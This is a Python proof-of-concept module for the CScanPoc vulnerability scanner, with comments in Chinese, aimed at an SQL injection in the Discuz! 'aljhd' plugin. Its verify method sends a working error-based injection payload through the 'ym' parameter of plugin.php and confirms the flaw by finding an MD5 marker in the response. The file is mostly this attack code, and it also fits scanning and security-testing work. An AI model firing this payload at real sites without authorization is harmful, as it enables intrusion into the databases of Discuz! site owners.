# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Discuz_0033'  # 平台漏洞编号，留空
    name = 'Discuz! 插件注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-03-21'  # 漏洞公布时间
    desc = '''
        Discuz! 文件source/plugin/aljhd/aljhd.inc.php122行附近：
        发现对其中的ym仅仅是做了addslashes处理，我们知道的addslashes编码仅仅是在gbk下才有作用。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1422/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1e3f2b58-f55e-4520-a93c-ac1eaec437b9'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/plugin.php?id=aljhd&type=1&status=&ym=1'
            data = "%20and%20(select%201%20from%20(select%20count(*),concat(md5(c),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%20type=1"
            url = self.target + payload + data
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
